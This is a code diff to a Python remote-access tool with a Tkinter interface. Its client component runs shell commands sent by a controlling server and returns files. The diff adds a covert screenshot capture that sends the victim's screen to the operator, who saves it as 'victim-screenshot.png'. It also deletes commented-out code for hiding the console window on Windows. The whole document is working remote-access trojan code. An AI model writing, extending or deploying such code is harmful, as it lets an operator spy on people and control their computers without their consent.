@@ -9,7 +9,8 @@ import subprocess
 import os
 import select
 import signal
-import sys
+import pyscreenshot
+import pickle
 
 # All the buttons colors:
 button_color = '#85d5fb'
@@ -162,14 +163,32 @@ class Server():
                 if self.client.fileno() == -1:
                     self.client.close()
                     continue
-                read, _, _ = select.select([self.client], [], [], 0.5)
+                read, _, _ = select.select([self.client], [], [], 1)
                 if self.client in read:
                     self.output = self.client.recv(1024).decode()
                     if not self.output:
                         self.client.close()
                         self.is_client_connected = False
                         break
-                    if self.recv_out_put_bool:
+                    if self.output == "screenshot--*#($)&":
+                        self.client.sendall(b'ok')
+                        data = self.client.recv(1024).decode()
+                        self.file_name, self.file_size = data.split('|')
+                        self.file_size = int(self.file_size)
+                        self.client.sendall(b'ok')
+
+                        with open("victim-screenshot.png", 'wb') as file:
+                            while self.file_size > 0:
+                                data = self.client.recv(min(self.file_size, 4096))
+                                file.write(data)
+                                self.file_size -= len(data)
+                                if not data:
+                                    break
+                            self.client.sendall(b'ok')
+                        subprocess.run(['xdg-open', 'victim-screenshot.png'])
+                        
+
+                    else:
                         self.output_lines = self.output.split('\n')
                         for self.line in self.output_lines:
                             run_login.run_server.output_list.insert(tk.END, self.line)
@@ -292,13 +311,44 @@ class Client():
                 if self.client_socket in readable:
                     try:
                         self.command = self.client_socket.recv(1024).decode()
+
                         if self.command == "exit":
                             pid = os.getpid()
                             os.kill(pid, signal.SIGTERM)
                             exit_program()
+
                         elif self.command[0:3] == "cd ":
                             os.chdir(self.command[3:])
                             self.client_socket.send(os.getcwd().encode())
+
+                        elif self.command == 'screenshot':
+                            try:
+                                self.client_socket.send("screenshot--*#($)&".encode())
+                                self.client_socket.recv(1024)
+                                self.screenshot = pyscreenshot.grab()
+                                self.file_name = "screenshot--*#($)&.png"
+                                self.screenshot.save(self.file_name)
+
+                                self.file_size = os.path.getsize(self.file_name)
+                                self.client_socket.send(f"{self.file_name}|{self.file_size}".encode())
+                                self.msg = self.client_socket.recv(1024)
+                                if self.msg == b'ok':
+                                    try:
+                                        file = open(self.file_name, 'rb')
+                                        data = file.read()
+                                    except:
+                                        self.client_socket.send("could not open screenshot file!".encode())
+                                    try:
+                                        self.client_socket.sendall(data)
+                                        self.client_socket.recv(1024)
+                                    except:
+                                        self.client_socket.send("could not send data!".encode())
+                                else:
+                                    raise Exception('client did not recieved file name and size')
+
+                            except:
+                                self.client_socket.send("couldn't take screenshot".encode())
+
                         elif self.command[0:8] == "showfile":
                             self.file_name = self.command[9:]
                             self.file_directory = f"{os.getcwd()}/{self.file_name}"
@@ -311,6 +361,7 @@ class Client():
                                 self.client_socket.sendall(self.data)
                             except:
                                 print("coudn't send the file!")
+                                
                         else:
                             try:
                                 self.completed_process = subprocess.run(self.command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=2)
@@ -1060,16 +1111,6 @@ def x():
         exit_program()
 
 #__________________________________________________
-
-
-
-# if sys.platform.startswith('win'):
-#     # hide the console window in Windows
-#     startupinfo = subprocess.STARTUPINFO()
-#     startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-#     startupinfo.wShowWindow = subprocess.SW_HIDE
-# else:
-#     startupinfo = None
 
 
 # Creating a window
